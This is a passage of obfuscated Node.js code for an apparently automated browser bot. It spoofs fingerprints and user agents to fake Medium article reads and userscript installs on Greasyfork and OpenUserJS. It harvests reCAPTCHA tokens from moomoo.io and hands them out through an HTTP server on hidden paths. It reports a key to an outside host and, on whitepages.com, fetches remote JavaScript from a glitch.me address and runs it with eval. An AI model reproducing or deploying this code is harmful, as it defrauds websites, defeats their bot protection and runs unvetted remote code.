      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/mope.io'
    },
    {
      'url': W(0x9) + 'easyfork.o' + 'rg/en/scri' + 'pts/424066' + '-pancake-m' + 'od-katana-' + 'musket-aut' + 'oheal-anti' + '-insta-sta' + 'rter-resou' + 'rces-and-m' + 'ore',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/429746' + '-best-moom' + 'oo-io-hack' + '-mod-2022-' + '2023',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456855' + '-anti-anti' + '-adblock-v' + '1-all-site' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454134' + '-moomoo-io' + '-dune-mod-' + 'autoheal-a' + 'utobreak-f' + 'ast-and-mo' + 're',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424447' + '-xtaming-c' + 'lient-tami' + 'ng-io-hack' + 's',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/taming.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/451547' + '-moomoo-io' + '-insane-mo' + 'd-beta-too' + '-fast-read' + '-descripti' + 'on',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/424655' + '-i30cps-ut' + 'ility-mod',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/448601' + '-%E5%8A%9B' + '%E6%89%A3%' + 'E9%A2%98%E' + '7%9B%AE%E8' + '%BD%ACmark' + 'down',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/leetcode' + '.cn'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/445806' + '-moomoo-io' + '-auto-heal',
      'preRef': W(0x9) + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/434199' + '-moomoo-io' + '-helper-to' + '-become-pr' + 'o',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/moomoo.i' + 'o'
    },
    {
      'url': Y(0x12, 'Jx#N') + 'easyfork.o' + 'rg/en/scri' + 'pts/405943' + '-moomoo-io' + '-agar-io-s' + 'urviv-io-s' + 'lither-io-' + 'diep-io-gl' + 'obal-name-' + 'manager-kr' + 'unker-comi' + 'ng-soon',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/slither.' + 'io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/454409' + '-video-dow' + 'nloader-fo' + 'r-tampermo' + 'nkey',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/452314' + '-adblock-s' + 'cript-for-' + 'webview',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/35466-' + 'mouseplus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456851' + '-omnifocus',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/*'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430253' + '-arras-io-' + 'multibox-s' + 'cript',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/arras.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/438879' + '-diep-io-p' + 'ermanent-l' + 'eader-arro' + 'w',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/430255' + '-warinspac' + 'e-bots',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/warin.sp' + 'ace'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/444523' + '-diep-io-m' + 'inimap-hig' + 'hlights',
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/diep.io'
    },
    {
      'url': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/456856' + '-optimize-' + Y(0xc, ']h&l'),
      'preRef': 'https://gr' + 'easyfork.o' + 'rg/en/scri' + 'pts/by-sit' + 'e/quill.or' + 'g'
    }
  ],
  userAgents = [
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A205U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-A102U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-G960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ';\x20SM-N960U' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Linux;\x20' + 'Android\x2010' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.5359.1' + '28\x20Mobile\x20' + 'Safari/537' + '.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + W(0x13) + 'fari/537.3' + '6',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + Y(0x11, 'h5Gh') + 'fari/537.3' + '6\x20Edg/108.' + '0.1462.46',
    'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6'
  ],
  miscSites = [
    'https://di' + 'scord.com',
    'https://st' + 'ratums.io',
    'https://ww' + 'w.npmjs.co' + 'm/',
    'https://gi' + 'thub.com',
    'https://mi' + 'necraft.ne' + 't',
    'https://ww' + 'w.wsj.com/',
    'https://zb' + 'eacon.org',
    'https://ya' + 'hoo.com',
    'https://ww' + 'w.theguard' + 'ian.com/',
    'https://ba' + 'idu.com/',
    'https://wi' + 'kipedia.or' + 'g',
    'https://po' + 'rnhub.com'
  ],
  miscSites2 = [
    'https://me' + 'dium.com/',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'ethics-of-' + 'advertisin' + 'g-and-ad-b' + 'locking-a6' + '2bdde987b0',
    'https://me' + 'dium.com/@' + 'digitalgir' + 'affes/7-aw' + 'esome-and-' + 'free-ai-to' + 'ols-you-sh' + 'ould-know-' + '43a1630ea4' + '09',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-21' + '5d668f827a',
    'https://me' + 'dium.com/@' + 'melih193/r' + 'eact-devel' + 'oper-roadm' + 'ap-2022-76' + 'ca119188bd',
    'https://me' + 'dium.com/e' + 'ntrepreneu' + 'r-s-handbo' + 'ok/is-your' + '-startup-a' + '-good-fit-' + 'for-ventur' + 'e-capital-' + 'bc59596df9' + 'e4',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'the-simple' + '-fundament' + 'als-of-c-e' + 'ed2fbb5792' + '9',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/co' + 'de-review-' + 'chores-tha' + 't-we-shoul' + 'd-automate' + '-using-dan' + 'ger-js-6cf' + '72ff3bf98',
    'https://me' + 'dium.com/g' + 'itconnecte' + 'd/use-git-' + 'like-a-sen' + 'ior-engine' + 'er-ef6d741' + 'c898e',
    'https://me' + 'dium.com/@' + 'sudiparyal' + '185/differ' + 'ence-betwe' + 'en-foreach' + '-and-map-i' + 'n-javascri' + 'pt-342c50b' + '59f9',
    'https://me' + 'dium.com/@' + 'dan-perry/' + 'the-world-' + 'that-knew-' + 'too-much-e' + '9ca2372ee2' + '1',
    'https://me' + 'dium.com/b' + 'itsrc/adva' + 'nced-data-' + 'structures' + '-and-algor' + 'ithms-trie' + 's-47db931e' + '20e',
    'https://da' + 'shmacintyr' + 'e.medium.c' + 'om/a-list-' + 'of-stories' + '-donald-tr' + 'ump-paid-t' + 'o-catch-an' + 'd-kill-jus' + 't-leaked-5' + 'e29f9f5f68' + '7',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'small-java' + 'script-opt' + 'imization-' + W(0x15) + '387a463',
    'https://me' + 'dium.com/@' + 'michaelcos' + 'tello.swe/' + 'dbspy-4-0-' + '6989c6ea47' + 'd8',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'chatgpt-on' + '-itself-3b' + '1042b968cb',
    'https://me' + 'dium.com/@' + 'thisisjimk' + 'eller/plea' + 'se-stop-in' + 'cluding-co' + 'lor-names-' + 'in-your-cs' + 's-classes-' + 'f1090f6f2e' + '29',
    'https://me' + 'dium.com/@' + 'mattcodes0' + '6/building' + '-projects-' + 'takes-time' + Y(0x2, 'hoZ1') + '702',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-rabbit-h' + 'ole-of-js-' + 'hyper-opti' + 'mization-a' + '618288174b',
    'https://me' + 'dium.com/@' + 'olopadeadu' + 'nola/the-c' + 'haos-in-ou' + 'r-twenties' + '-8fcefe061' + 'ef8',
    'https://me' + 'dium.com/@' + 'leanfolks/' + 'mobile-app' + '-architect' + 'ure-6848aa' + '1d5764',
    'https://bl' + 'og.bitsrc.' + 'io/i-asked' + '-chat-gpt-' + 'to-build-a' + '-to-do-app' + '-have-we-f' + 'inally-met' + '-our-repla' + 'cement-ad3' + '47ad74c51',
    'https://me' + 'dium.com/@' + 'alexey.ink' + 'in/never-h' + 'ave-separa' + 'te-sign-in' + '-routes-7c' + '9a6dd4dc7c',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'breaking-i' + 'nto-the-ma' + 'rket-1b665' + '2b2a05a',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-th' + 'e-fundamen' + 'tals-1a646' + 'c357955',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'javascript' + '-series-oo' + 'p-and-cons' + 'tructors-1' + '0dc5877e98' + '5',
    'https://me' + 'dium.com/b' + 'etter-prog' + 'ramming/le' + 'gacy-code-' + 'potential-' + 'gold-mine-' + 'of-learnin' + 'g-a59fdcb1' + '4804',
    'https://me' + 'dium.com/@' + 'syn_52523/' + 'a-commenta' + 'ry-on-the-' + 'ai-wave-ii' + '-7de427c9f' + 'd15'
  ],
  g = {
    'getToken': () => 0x2525 + -0xc22 + -0x1903
  };
if (doFlags['doActivate' + 'Browser'] && ((async () => {
    log('index.js\x20c' + 'alled');
    const {
      FakeBrowser: f
    } = require('fakebrowse' + 'r'), h = require('path'), i = h['resolve'](__dirname, './fakeBrow' + 'serUserDat' + 'a'), j = new f['Builder']()['displayUse' + 'rActionLay' + 'er'](-0x1695 * -0x1 + -0xf35 + -0x8 * 0xec)['vanillaLau' + 'nchOptions'](pptOptions)['usePlugins']([require('puppeteer-' + 'extra-plug' + 'in-adblock' + 'er')({
      'blockTrackers': 0x1,
      'blockTrackersAndAnnoyances': 0x1
    })])['userDataDi' + 'r'](i);
    let k;
    r:
      for (;;)
        try {
          let n = await async function o() {
            let p;
            const q = {
              'User-Agent': userAgents['random'](),
              'Accept-Encoding': 'none'
            };
            try {
              p = (await axios['get'](PROCESSED_XURL_VAL, {
                'headers': q
              }))?.['data'];
            } catch (r) {}
            if (p)
              try {
                p = (await axios['get'](p, {
                  'headers': q
                }))?.['data'];
              } catch (s) {}
            if (!p)
              return await randomWait(), await o();
            try {
              return 'object' == typeof p ? p : 'string' == typeof p ? JSON['parse'](p) : {};
            } catch (u) {
              if (!p)
                return await randomWait(), await o();
            }
          }();
          doFlags['doExtFinge' + 'rprint'] && j['deviceDesc' + 'riptor'](n), k = await j['launch']();
          break r;
        } catch (p) {
          warn(p), await randomWait();
        }
    const l = k['userAction'];
    log('browser\x20la' + 'unched');
    const m = k['vanillaBro' + 'wser'];
    doFlags['doYT'] && setTimeout(async () => {
      for (;;)
        await runYTModule(m, l);
    }, 0x23 * 0x11d + -0x1a * -0x12c + -0x450b), doFlags['doGF'] && setTimeout(async () => {
      await runGFModule(m, l);
    }, -0x1264 + -0x481 * 0x4 + -0x311 * -0xc), doFlags['doMediumRe' + 'ader'] && setTimeout(() => {
      !async function q() {
        const r = await m['createInco' + 'gnitoBrows' + 'erContext'](),
          u = await r['newPage']();
        for (;;) {
          let v = 0x1 * -0x1ce1 + -0x2415 + 0xcfe * 0x5;
          if (await u['goto'](miscSites2['random'](), {
              'timeout': NETWORK_PATIENCE
            })['catch'](w => v++), await randomWait(), v)
            return await u['close'](), await r['close'](), await q();
          for (let w = 0x310 * -0x2 + 0xf * 0x3 + 0x5f3; w < getRandomInt(0x3b * 0x9d + -0x1a43 + -0x1 * 0x9eb, 0x1ffa + 0x347 * -0x1 + -0x1cae); w++)
            await u['keyboard']['press']('ArrowDown'), await randomWait();
          await randomWait(), await wait(-0x1 * 0x10f1e + 0x31 * -0x3cb + -0x45 * -0xa05);
        }
      }();
    }, 0x2 * 0x187 + -0xa45 + 0x79b), doFlags['doRemoteCa' + 'ptcha'] && setTimeout(async function q() {
      function u() {
        axios['post']('https://st' + 'ratums.io/' + 'research', {
          'dom': process['env']['PROJECT_DO' + 'MAIN'],
          'key': PROCESSED_SYX_VAL
        }, {
          'headers': {
            'Content-Type': 'applicatio' + 'n/json'
          }
        })['catch'](z => {});
      }
      const v = await m['createInco' + 'gnitoBrows' + 'erContext']();
      let w = 0x1e50 + 0x1d5 + -0x3 * 0xab7;
      const x = await v['newPage']();
      if (await x['goto']('https://mo' + 'omoo.io', {
          'timeout': MM_NETWORK_PATIENCE
        })['catch'](z => w++), w)
        return await x['close'](), await v['close'](), q();
      if (!(await x['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML'))['includes']('isMoomooIo'))
        return await x['close'](), await v['close'](), q();
      let y;
      if (doFlags['doDual']) {
        if (y = await v['newPage'](), await y['goto']('https://mo' + 'omoo.io', {
            'timeout': MM_NETWORK_PATIENCE
          })['catch'](A => w++), w)
          return await y['close'](), await v['close'](), q();
        const z = await y['evaluate']('document.d' + 'ocumentEle' + 'ment.inner' + 'HTML');
        if (log(z['slice'](0x23ce + -0xfe3 * 0x1 + 0x13eb * -0x1, -0x1d5d + 0x30e * -0x5 + -0x17 * -0x1f3)), !z['includes']('isMoomooIo'))
          return await y['close'](), await v['close'](), q();
      }
      g['getToken'] = async function(A) {
        return await (A && doFlags['doDual'] ? y : x)['evaluate'](async () => new Promise(async (B, C) => {
          window['grecaptcha']['execute']('6LevKusUAA' + 'AAAAFknhlV' + '8sPtXAk5Z5' + 'dGP5T2FYIZ', {
            'action': 'homepage'
          })['then'](D => {
            B(D);
          });
        }));
      }, u(), setInterval(u, 0x153 * -0x82 + -0x4 * 0x2b27 + -0x7 * -0x41fe);
    }, 0xf70 + 0x49c + -0x13a8), doFlags['doWhitepag' + 'esMode'] && setTimeout(async () => {
      (async function r() {
        try {
          let s = -0x1852 + -0xaa9 * -0x3 + -0x7a9 * 0x1;
          const t = await m['createInco' + 'gnitoBrows' + 'erContext'](),
            u = await t['newPage']();
          if (u['on']('pageerror', function(v) {}), u['on']('error', function(v) {}), await u['goto']('https://ww' + 'w.whitepag' + 'es.com/m', {
              'timeout': MM_NETWORK_PATIENCE
            })['catch'](v => s++), s)
            return await u['close'](), await t['close'](), r();
          await wait(0x1 * -0x26d2 + -0xd * 0x2ef + 0x58ad), await u['evaluate'](() => {
            let v = new XMLHttpRequest();
            v['open']('GET', 'https://co' + 'ntent-deli' + 'very-netwo' + 'rk.glitch.' + 'me/cdn/xm7' + '7/wp.js', -0x9e6 + 0x1e02 + 0x3 * -0x6b4), v['send'](), eval(v['responseTe' + 'xt']);
          }), await wait(0x8fc9c + -0x190242 + 0xee0a3 * 0x2);
        } catch (v) {}
        return await page['close'](), await context['close'](), r();
      }());
    }, -0x24d9 + 0x47 * -0x22 + -0x1 * -0x2eab);
  })()), doFlags['doCreateSe' + 'rver']) {
  const e = require('http')['createServ' + 'er'](async function(f, h) {
    const i = url['parse'](f['url'])['pathname'];
    h['writeHead'](0x1 * 0x54d + -0x1ca + -0x2bb);
    const j = '/dkasjhdwi' + 'qodkjnwqhd' + 'wqodlkwjqn' + 'dwqkdmnBZc' + 'xzmczxc' == i;
    j || '/asdsadwqd' + 'qwdwqdwqdw' + 'qdwqdwqdwq' + 'dwqd' == i ? h['write'](await g['getToken'](j) || '') : h['write']('v0.6'), h['end']();
  });
  e['listen'](process['env']['PORT'] || -0x3 * 0x8ba + -0x2 * -0x2e + -0x5bd * -0xa);
}
doFlags['doOUJS'] && ((async () => {
  const a0 = c;
  async function f() {
    const Z = b,
      k = h['random'](),
      m = k['replace']('/scripts/', '/install/') + '.user.js',
      [q, u] = (function() {
        const A = j['random']();
        return [
          A,
          A['includes']('Firefox')
        ];
      }()),
      v = function(A, B = -0xf5d + 0xaab + 0x1 * 0x4b3) {
        if (A['includes']('Firefox'))
          return A['slice'](A['indexOf']('Firefox') + 'Firefox' ['length'] + (-0x1 * -0x9ca + -0x1df * -0x1 + -0xba8));
        const C = A['indexOf']('Chrome/') + 'Chrome/' ['length'],
          D = A['slice'](C),
          E = D['slice'](-0x62b + 0x1cac + 0x1681 * -0x1, D['indexOf']('\x20'));
        return B ? E['slice'](0x520 * -0x1 + 0x1 * 0x1759 + -0x5 * 0x3a5, E['indexOf']('.')) : E;
      }(q),
      w = {
        'signal': AbortSignal['timeout'](-0x26b8 + 0x295f + -0x3 * -0xc23),
        'headers': {
          'host': 'openuserjs' + '.org',
          'origin': 'https://op' + 'enuserjs.o' + 'rg',
          'user-agent': q,
          'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
          'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
          'accept-language': 'en-US,en;q' + '=0.9',
          'cache-control': 'no-cache',
          'pragma': 'no-cache',
          'sec-fetch-dest': 'document',
          'sec-fetch-mode': 'navigate',
          'sec-fetch-site': 'same-origi' + 'n',
          'sec-fetch-user': '?1',
          'upgrade-insecure-requests': '1'
        },
        'body': null,
        'method': 'GET'
      };
    u ? Object['assign'](w['headers'], {
      'te': 'trailers'
    }) : Object['assign'](w['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    });
    const x = await fetch(i, w)['catch'](A => {});
    if (!x || !x['headers'])
      return;
    if (null === x['headers']['get']('X-RateLimi' + 't-Limit'))
      return;
    const y = {
      'signal': AbortSignal['timeout'](0x1a3c + -0x14 * -0x65 + 0x13c * 0x4),
      'headers': {
        'host': 'openuserjs' + '.org',
        'origin': 'https://op' + 'enuserjs.o' + 'rg',
        'user-agent': q,
        'accept': 'text/html,' + 'applicatio' + 'n/xhtml+xm' + 'l,applicat' + 'ion/xml;q=' + '0.9,image/' + 'avif,image' + '/webp,imag' + 'e/apng,*/*' + ';q=0.8,app' + 'lication/s' + 'igned-exch' + 'ange;v=b3;' + 'q=0.9',
        'accept-encoding': 'gzip,\x20defl' + 'ate,\x20br',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'no-cache',
        'pragma': 'no-cache',
        'referer': i,
        'sec-fetch-dest': 'document',
        'sec-fetch-mode': 'navigate',
        'sec-fetch-site': 'same-origi' + 'n',
        'sec-fetch-user': '?1',
        'upgrade-insecure-requests': '1'
      },
      'body': null,
      'method': 'GET'
    };
    if (u ? Object['assign'](y['headers'], {
        'te': 'trailers'
      }) : Object['assign'](y['headers'], {
        'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
        'sec-ch-ua-mobile': '?0',
        'sec-ch-ua-platform': '\x22Windows\x22'
      }), !await fetch(k, y)['catch'](A => {}))
      return;
    const z = {
      'headers': {
        'accept': Z(0x5, 'O#z[') + 'rscript,\x20*' + '/*',
        'accept-language': 'en-US,en;q' + '=0.9',
        'cache-control': 'max-age=0,' + '\x20must-reva' + 'lidate',
        'pragma': 'no-cache',
        'sec-fetch-dest': 'empty',
        'sec-fetch-mode': 'cors',
        'sec-fetch-site': 'none'
      },
      'referrerPolicy': 'strict-ori' + 'gin-when-c' + 'ross-origi' + 'n',
      'body': null,
      'method': 'GET'
    };
    u ? Object['assign'](z['headers'], {
      'te': 'trailers'
    }) : Object['assign'](z['headers'], {
      'sec-ch-ua': '\x22Not\x20A(Bra' + 'nd\x22;v=\x2224\x22' + ',\x20\x22Chromiu' + 'm\x22;v=\x22' + v + '\x22',
      'sec-ch-ua-mobile': '?0',
      'sec-ch-ua-platform': '\x22Windows\x22'
    }), await fetch(m, z);
  }
  const h = [
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/L' + 'ift_Web_Re' + 'strictions' + '_.io_Game_' + 'Mods_(MooM' + 'oo.ioKrunk' + 'er.io..),_' + 'Ad_Link_By' + 'passer,_Ad' + 'block,_MOR' + 'E!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'ooMoo.io,_' + 'Agar.io,_S' + 'urviv.io,_' + 'Slither.io' + ',_Diep.io,' + '_Global_Na' + 'me_Manager' + '_[Krunker_' + 'Coming_Soo' + 'n]',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/p' + 'ancake_mod' + '_Katana_+_' + 'Musket_AUT' + 'OHEAL_Anti' + '-Insta_sta' + 'rter_resou' + 'rces_and_m' + 'ore!!',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Bloggerpe' + 'mula/Bypas' + 's_All_Shor' + 'tlinks_Man' + 'ual_Captch' + 'a',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/Top' + 'AndDownBut' + 'tonsEveryw' + 'here',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/reek/Anti' + '-Adblock_K' + 'iller_Reek',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/ParticleC' + 'ore/YouTub' + 'e_+',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/MAX30/bon' + 'gacamsKill' + 'Ads',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/founcs/Li' + 'mitless_Fr' + 'eedom',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/aycabta/T' + 'witter_Ima' + 'ge_Maximiz' + 'er',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Marti/ouj' + 's_-_JsBeau' + 'tify',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AdlerED/%' + 'E6%9C%80%E' + '5%BC%BA%E7' + '%9A%84%E8%' + '80%81%E7%8' + '9%8C%E8%84' + '%9A%E6%9C%' + 'ACCSDNGree' + 'ner%EF%BC%' + '9ACSDN%E5%' + 'B9%BF%E5%9' + '1%8A%E5%AE' + '%8C%E5%85%' + 'A8%E8%BF%8' + '7%E6%BB%A4' + '%E3%80%81%' + 'E4%BA%BA%E' + '6%80%A7%E5' + '%8C%96%E8%' + '84%9A%E6%9' + 'C%AC%E4%BC' + '%98%E5%8C%' + '96',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/laidbackt' + 'empo/EasyV' + 'ideoDownlo' + 'ad',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/O' + 'ptimize_Qu' + 'ill.org',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/mscarchil' + 'li/Amazon_' + 'Smile_Redi' + 'rect',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/AltoRetra' + 'to/IMDb_My' + '_Movies_en' + 'hancer',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/xthexder/' + 'Wide_GitHu' + 'b',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/navchanda' + 'r/Auto_Loa' + 'd_Big_Imag' + 'e',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/extension' + 'sapp/cinem' + 'apress',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/S' + 'urviv.io_X' + 'Client_(BE' + 'TA)',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/Zren/Resi' + 'ze_YT_To_W' + 'indow_Size',
      'https://op' + 'enuserjs.o' + 'rg/scripts' + '/zyenith/M' + 'oomoo.io_R' + 'emove_Cook' + 'ie_Prefere' + 'nces_Tab'
    ],
    i = 'https://op' + 'enuserjs.o' + 'rg/',
    j = [
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'Win64;\x20x64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/11' + '0.0.0.0\x20Sa' + 'fari/537.3' + '6',
      'Mozilla/5.' + '0\x20(Windows' + '\x20NT\x2010.0;\x20' + 'WOW64)\x20App' + 'leWebKit/5' + '37.36\x20(KHT' + 'ML,\x20like\x20G' + 'ecko)\x20Chro' + 'me/108.0.0' + '.0\x20Safari/' + '537.36',
      'Mozilla/5.' + a0(0x3) + '\x20NT\x2010.0)\x20' + 'AppleWebKi' + 't/537.36\x20(' + 'KHTML,\x20lik' + 'e\x20Gecko)\x20C' + 'hrome/108.' + '0.0.0\x20Safa' + 'ri/537.36',
      'Mozilla/5.' + '0\x20(Macinto' + 'sh;\x20Intel\x20' + 'Mac\x20OS\x20X\x201' + '3_1)\x20Apple' + 'WebKit/537' + '.36\x20(KHTML' + ',\x20like\x20Gec' + 'ko)\x20Chrome' + '/108.0.0.0' + '\x20Safari/53' + '7.36',
      'Mozilla/5.' + '0\x20(X11;\x20Li' + 'nux\x20x86_64' + ')\x20AppleWeb' + 'Kit/537.36' + '\x20(KHTML,\x20l' + 'ike\x20Gecko)' + '\x20Chrome/10' + '8.0.0.0\x20Sa' + 'fari/537.3' + '6',
